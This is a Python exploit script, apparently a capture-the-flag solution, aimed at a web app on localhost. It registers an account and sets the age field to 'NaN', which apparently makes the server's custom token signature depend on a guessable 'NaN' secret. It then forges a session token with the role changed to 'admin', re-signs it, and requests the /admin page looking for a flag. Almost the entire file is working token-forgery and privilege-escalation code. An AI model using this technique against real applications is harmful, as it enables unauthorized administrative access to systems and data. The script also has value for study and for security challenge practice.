import requests
import base64
import json
import hashlib
import hmac
import urllib.parse
import re

# Server URL
url = 'http://localhost:3000'

# User credentials
username = 'your_username'
password = 'your_password'
supersecret = '1337'
# Register and login to get a valid token
session = requests.Session()

# Register
session.post(f'{url}/register', data={
    'username': username,
    'password': password,
    'nickname': 'nickname',
    'age': '25',
    'interests': 'interests'
})

# Extract the token from cookies
token = session.cookies.get('token')
token = urllib.parse.unquote(token)
print(f'Original Token: {token}')

def create_signature(payload, secret):
    print(f'{payload}:{secret}')
    return hmac.new(str(secret).encode("utf-8"), payload.encode(), hashlib.sha256).hexdigest()

def custom_jwt_sign(data, secret):
    payload = json.loads(base64.b64decode(data))
    pl = base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode()
    print(f'{pl}:{secret}')
    signature = create_signature(f'{pl}:{secret}', 'NaN')
    return f'{signature}'

def custom_jwt_forge(payload, role):
    # Replace age and role using regex
    new_token = base64.b64decode(payload.split('.')[0]).decode()
    print(new_token)
    new_token = re.sub(r'"age":"[^"]+"', '"age":"NaN"', new_token)
    new_token = re.sub(r'"role":"[^"]+"', f'"role":"{role}"', new_token)
    print(new_token)
    new_token = base64.b64encode(new_token.encode()).decode()
    signature = custom_jwt_sign(new_token, 'NaN')
    forged_payload = new_token.replace('=', '%3d')
    return f'{forged_payload}.{signature}'

# Decode the original token
payload, signature = token.split('.')
payload_json = json.loads(base64.b64decode(payload))

# Update profile to set the age to a non-numerical value
response = session.post(f'{url}/update-profile', data={
    'username': username,
    'password': password,
    'nickname': 'nickname',
    'age': 'NaN',
    'interests': 'interests'
}, headers={'Cookie': f'token={urllib.parse.quote(token)}'})

print(response.text)

if response.status_code != 200:
    print('Failed to update profile')
    exit(1)

# Login again to get a new token
response = session.post(f'{url}/login', data={
    'username': username,
    'password': password
})

new_token = session.cookies.get('token')
new_token = urllib.parse.unquote(new_token)
print(f'New Token: {new_token}')

# Forge the token with the modified payload
forged_token = custom_jwt_forge(new_token, 'admin')
print(f'Forged Token: {forged_token}')

# URL encode the forged token to handle special characters
forged_token_encoded = forged_token

# Send the forged token to the server
session.cookies.set('token', forged_token_encoded)
response = session.get(f'{url}/admin')

if 'flag' in response.text.lower():
    print('Exploit successful! Admin page accessed.')
else:
    print('Exploit failed.')

print(response.text)
